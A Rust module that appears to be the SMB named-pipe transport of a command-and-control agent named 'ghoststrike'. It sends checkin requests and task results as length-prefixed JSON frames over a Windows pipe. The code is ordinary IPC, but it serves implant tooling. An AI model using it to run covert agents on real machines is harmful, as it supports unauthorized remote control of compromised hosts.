/// SMB named-pipe transport (Windows-only).
///
/// Protocol: same JSON checkin/taskresult frames as HTTP, framed with a 4-byte
/// little-endian length prefix over the named pipe.
use anyhow::{bail, Result};
use uuid::Uuid;

use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, Task, TaskResultReq};
use crate::config::AgentConfig;

pub struct SmbTransport {
    pipe_name: String,
}

impl SmbTransport {
    pub fn new(cfg: &AgentConfig) -> Result<Self> {
        let pipe_name = cfg
            .pipe_name
            .clone()
            .unwrap_or_else(|| r"\\.\pipe\ghoststrike".to_string());
        Ok(Self { pipe_name })
    }
}

#[async_trait::async_trait]
impl super::TransportInner for SmbTransport {
    async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp> {
        let body = serde_json::to_vec(req)?;
        let resp_bytes = pipe_roundtrip(&self.pipe_name, &body)?;
        Ok(serde_json::from_slice(&resp_bytes)?)
    }

    async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()> {
        let req = TaskResultReq {
            task_id:  task.id,
            agent_id,
            output,
            success:  true,
        };
        let body = serde_json::to_vec(&req)?;
        pipe_roundtrip(&self.pipe_name, &body)?;
        Ok(())
    }
}

/// Open pipe, write length-prefixed frame, read length-prefixed response.
fn pipe_roundtrip(pipe_name: &str, data: &[u8]) -> Result<Vec<u8>> {
    #[cfg(target_os = "windows")]
    {
        return smb_windows(pipe_name, data);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (pipe_name, data);
        bail!("SMB transport is Windows-only");
    }
}

#[cfg(target_os = "windows")]
fn smb_windows(pipe_name: &str, data: &[u8]) -> Result<Vec<u8>> {
    use windows_sys::Win32::Foundation::{GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, ReadFile, WriteFile,
        OPEN_EXISTING, FILE_FLAG_OVERLAPPED,
    };
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let wide: Vec<u16> = OsStr::new(pipe_name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let handle = unsafe {
        CreateFileW(
            wide.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            std::ptr::null(),
            OPEN_EXISTING,
            0,
            0,
        )
    };

    if handle == INVALID_HANDLE_VALUE {
        bail!("CreateFileW failed for pipe {pipe_name}");
    }

    // Write: 4-byte LE length prefix + data
    let len_bytes = (data.len() as u32).to_le_bytes();
    let mut written = 0u32;
    unsafe {
        WriteFile(handle, len_bytes.as_ptr(), 4, &mut written, std::ptr::null_mut());
        WriteFile(handle, data.as_ptr(), data.len() as u32, &mut written, std::ptr::null_mut());
    }

    // Read: 4-byte LE length prefix
    let mut resp_len_bytes = [0u8; 4];
    let mut read_bytes = 0u32;
    unsafe {
        ReadFile(handle, resp_len_bytes.as_mut_ptr(), 4, &mut read_bytes, std::ptr::null_mut());
    }
    if read_bytes < 4 {
        unsafe { windows_sys::Win32::Foundation::CloseHandle(handle); }
        bail!("pipe read truncated");
    }
    let resp_len = u32::from_le_bytes(resp_len_bytes) as usize;

    // Read payload
    let mut resp = vec![0u8; resp_len];
    let mut total = 0usize;
    while total < resp_len {
        let mut n = 0u32;
        unsafe {
            ReadFile(
                handle,
                resp[total..].as_mut_ptr(),
                (resp_len - total) as u32,
                &mut n,
                std::ptr::null_mut(),
            );
        }
        if n == 0 { break; }
        total += n as usize;
    }

    unsafe { windows_sys::Win32::Foundation::CloseHandle(handle); }
    Ok(resp)
}
